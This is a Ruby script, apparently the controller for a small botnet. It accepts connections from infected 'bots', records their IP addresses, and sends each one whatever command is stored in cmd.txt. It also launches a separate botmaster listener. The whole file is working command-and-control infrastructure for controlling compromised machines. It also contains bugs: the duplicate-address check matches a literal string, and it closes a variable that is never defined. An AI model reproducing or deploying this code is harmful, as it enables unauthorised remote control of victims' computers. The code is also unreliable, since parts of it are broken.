#!/usr/bin/env ruby


require 'socket'


port = 6666  # CHANGE THIS
masterport = 45678
puts "
_______ _______ ______ _______
|     __|       |   __ \\   _   |
|__     |   -   |      <       |
|_______|_______|___|__|___|___|

Made with <3 by AM-77

To stop the server, type \`pkill ruby'\n"
puts "[!] Starting bot listener on port #{port}"
server = TCPServer.new("0.0.0.0", port)  # Change this to the port you have the client connecting to

# Always override previous file
cmdf = File.new("cmd.txt", 'w')
cmdf.puts("NONE")
cmdf.close
puts "[!] Starting botmaster listener on port #{masterport}..."
system("ruby botmaster.rb #{masterport} &")  # CHANGE THIS

bot_file = File.new("bots.txt", 'a+')

loop do

  # Wait until client connects
  socket = server.accept
  if File.readlines("bots.txt").grep(/socket.peeraddr[3]/).any?
    puts "[*] Conn from prev addr"
    next
  end
  puts "[*] New connection from #{socket.peeraddr[3]}"
  bot_file.write(socket.peeraddr[3])

  request = socket.gets
  STDERR.puts request

  cmd_file_read = File.new("cmd.txt", 'r')
  response = cmd_file_read.read
  socket.print response
  cmd_file.close

end
